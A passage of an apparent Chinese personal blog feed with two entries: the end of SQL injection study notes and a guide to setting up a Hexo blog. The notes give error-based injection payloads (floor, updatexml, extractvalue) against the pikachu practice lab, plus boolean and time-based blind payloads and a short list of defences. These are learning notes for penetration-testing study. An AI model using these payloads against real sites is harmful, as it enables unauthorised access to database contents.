class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">like ‘ro%’#判断ro或ro…是否成立</span><br><span class="line">regexp ‘^xiaodi[1-z]’#匹配xiaodi及xiaodi…等</span><br><span class="line">if(条件,5,0)#条件成立，返回5，反之，返回0</span><br><span class="line">sleep(5) #SQL语句延时执行5秒</span><br><span class="line">mid(a,b,c) #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c) #从B位置开始，截取字符串a的c长度</span><br><span class="line">left(database(),1),database() #left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8 #判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97 #判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure><p>涉及资源：</p><ol><li><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">12种报错注入+万能语句</a></p></li><li><p><a href="https://www.jianshu.com/p/fcae21926e5c">Order by排序注入方法小总结</a></p></li></ol><h3 id="Insert-update"><a href="#Insert-update" class="headerlink" title="Insert update"></a>Insert update</h3><p>语句：<code>insert into user(username,password) values(&#39;$username&#39;,&#39;$password&#39;,)</code></p><p><strong>floor</strong>：<code>username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#39;</code></p><p><strong>updatexml</strong>：<code>username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or &#39;</code></p><p><strong>extractvalue</strong>：<code>username=lwx’ or extractvalue(1,concat(0x7e,database())) or &#39;</code></p><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>在get中需要使用+号或者%20把语句连接起来，避免出错</p><p><strong>floor</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1</code></p><p><strong>updatexml</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) </code></p><p><strong>extractvalue</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1</code></p><h2 id="布尔与延时盲注"><a href="#布尔与延时盲注" class="headerlink" title="布尔与延时盲注"></a>布尔与延时盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ol><li><code>id=1&#39; and left(version(),1)=5 --+</code></li><li><code>id=1&#39; and length(database())=8--+</code></li></ol><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><ol><li><code>id=1 and if((length(database()=8)),sleep(5),1)--+</code></li><li><code>id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</code></li></ol><h1 id="防御SQL注入"><a href="#防御SQL注入" class="headerlink" title="防御SQL注入"></a>防御SQL注入</h1><p>需要分清各种防御针对的对象是谁。</p><ol><li>SQL语句的执行代码使用<strong>预编译</strong> PreparedStatement 。</li><li><strong>确定每个数据的类型</strong>，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？)</li><li><strong>限制传入数据的长度</strong>，这能够在一定程度上防止sql注入。</li><li>严格<strong>限制</strong>用户使用<strong>数据库的权限</strong>，能够在一定程度上减少sql注入的危害。</li><li>避免直接响应一些 sql 语句<strong>执行异常的信息</strong>。</li><li><strong>过滤</strong>参数中含有的一些数据库<strong>关键词</strong>。</li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><ol><li>实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名</li></ol><p>待补充…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入基础&quot;&gt;&lt;a href=&quot;#SQL注入基础&quot; class=&quot;headerlink&quot; title=&quot;SQL注入基础&quot;&gt;&lt;/a&gt;SQL注入基础&lt;/h1&gt;&lt;img src=&quot;images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>HEXO博客的搭建</title>
    <link href="https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2023-05-22T12:03:26.000Z</published>
    <updated>2023-05-23T09:20:27.191Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装HEXO和相关插件"><a href="#安装HEXO和相关插件" class="headerlink" title="安装HEXO和相关插件"></a>安装HEXO和相关插件</h1><h2 id="hexo的安装"><a href="#hexo的安装" class="headerlink" title="hexo的安装"></a>hexo的安装</h2><p>先安装node.js，地址：<a href="https://nodejs.org/en">https://nodejs.org/en</a></p><p>安装完后安装Hexo：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>配置腾讯云节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry http://mirrors.cloud.tencent.com/npm/</span><br><span class="line">npm config get registry# 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。</span><br></pre></td></tr></table></figure><h2 id="主题Pure以及配置"><a href="#主题Pure以及配置" class="headerlink" title="主题Pure以及配置"></a>主题Pure以及配置</h2><p>主题：<a href="https://github.com/cofess/hexo-theme-pure">https://github.com/cofess/hexo-theme-pure</a></p><p>先初始化一个文件夹，例如Blog：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init Blog</span><br></pre></td></tr></table></figure><p>加载主题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/cofess/hexo-theme-pure.git themes/pure</span><br></pre></td></tr></table></figure><p>更新主题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd themes/pure</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><p>配置（需要配置根目录config）：<a href="https://blog.cofess.com/2017/11/01/hexo-blog-theme-pure-usage-description.html">参考1</a>，<a href="https://w714860761.github.io/2020/06/14/HexoTwo/">参考2</a>，<a href="https://tianbiao.top/29-pure%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/">参考3</a>，<a href="https://hexo.io/zh-cn/docs/configuration.html">参考4</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language: zh-CN# 中文</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h1><p><a href="https://hexo.io/zh-cn/docs/writing">参考</a>，没啥要讲的，指令：<code>hexo n &quot;title&quot;</code>，即可。</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: HEXO博客的搭建</span><br><span class="line">toc: true</span><br><span class="line">sidebar: none</span><br><span class="line">date: 2023-05-22 20:03:26</span><br><span class="line">tags: [博客搭建]</span><br><span class="line">categories: [杂]</span><br><span class="line">descriptions: 本文介绍hexo搭建博客的心路历程</span><br><span class="line">typora-root-url: ..\..\..</span><br></pre></td></tr></table></figure><p>上面的<code>typora-root-url</code>很重要！下面说到。</p><h2 id="设置分类"><a href="#设置分类" class="headerlink" title="设置分类"></a>设置分类</h2><p>由于<code>post</code>文件夹里面的文章太多不好管理，那么只要我们分类一下即可。<a href="https://mrseawave.github.io/blogs/articles/2021/06/25/hexo-new-post-path/">参考</a></p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">permalink: &#x27;articles/:year/:month/:day/:name/&#x27;</span><br><span class="line">new_post_name: &#x27;:year/:month/:title.md&#x27;</span><br></pre></td></tr></table></figure><h2 id="Hexo与Typora协同"><a href="#Hexo与Typora协同" class="headerlink" title="Hexo与Typora协同"></a>Hexo与Typora协同</h2><p>先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。</p><p>解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录<code>typora-root-url</code>，让hexo能链接到即可！</p><p><a href="https://blog.hjforever.com/2021/03/13/tool/typora_hexo/">参考</a></p><h2 id="404转发"><a href="#404转发" class="headerlink" title="404转发"></a>404转发</h2><p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404%E9%A1%B5%E9%9D%A2/">https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404%E9%A1%B5%E9%9D%A2/</a></p><h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d # 推送 或者一起：hugo g -d</span><br><span class="line">hexo s # 本地测试</span><br><span class="line"></span><br><span class="line">hexo n &#x27;title&#x27;</span><br></pre></td></tr></table></figure><h2 id="推送hexo-d"><a href="#推送hexo-d" class="headerlink" title="推送hexo d"></a>推送<code>hexo d</code></h2><p>安装<code>npm install hexo-deployer-git --save</code></p><p>然后配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>参考：<a href="https://hexo.io/zh-cn/docs/one-command-deployment.html">https://hexo.io/zh-cn/docs/one-command-deployment.html</a></p><h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><h2 id="Spawn-failed"><a href="#Spawn-failed" class="headerlink" title="Spawn failed"></a>Spawn failed</h2><p><a href="https://blog.csdn.net/Kevin_Carpricron/article/details/124069885">https://blog.csdn.net/Kevin_Carpricron/article/details/124069885</a></p><h1 id="组件推荐"><a href="#组件推荐" class="headerlink" title="组件推荐"></a>组件推荐</h1><h2 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h2><p><a href="https://blog.51cto.com/u_15719567/5476056">https://blog.51cto.com/u_15719567/5476056</a></p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/images/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/image-20230523145936355.png" alt="image-20230523145936355"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装HEXO和相关插件&quot;&gt;&lt;a href=&quot;#安装HEXO和相关插件&quot; class=&quot;headerlink&quot; title=&quot;安装HEXO和相关插件&quot;&gt;&lt;/a&gt;安装HEXO和相关插件&lt;/h1&gt;&lt;h2 id=&quot;hexo的安装&quot;&gt;&lt;a href=&quot;#hexo的安装&quot; c</summary>
      
    
    
    
    <category term="杂" scheme="https://j3f5.github.io/categories/%E6%9D%82/"/>
    
    
    <category term="博客搭建" scheme="https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
